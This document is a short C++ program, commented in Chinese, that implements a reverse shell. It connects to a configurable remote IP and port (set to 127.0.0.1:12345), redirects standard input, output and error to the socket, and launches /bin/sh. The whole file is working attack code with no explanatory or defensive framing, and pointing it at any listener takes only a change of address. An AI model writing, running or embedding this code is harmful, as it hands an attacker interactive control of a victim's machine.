#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"  // 远程服务器 IP 地址
#define SERVER_PORT 12345      // 远程服务器端口号

int main() {
    int sockfd;
    struct sockaddr_in serv_addr;
    
    // 创建 TCP 套接字
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "ERROR opening socket" << std::endl;
        return EXIT_FAILURE;
    }

    // 设置服务器地址
    std::memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);
    
    // 转换 IP 地址
    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        std::cerr << "ERROR invalid server IP address" << std::endl;
        return EXIT_FAILURE;
    }

    // 连接到服务器
    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        std::cerr << "ERROR connecting" << std::endl;
        return EXIT_FAILURE;
    }

    // 重定向 stdin、stdout、stderr 到 socket
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDOUT_FILENO);
    dup2(sockfd, STDERR_FILENO);

    // 启动 shell
    char *const argv[] = {"/bin/sh", nullptr};
    execvp(argv[0], argv);

    // 关闭 socket
    close(sockfd);
    return EXIT_SUCCESS;
}
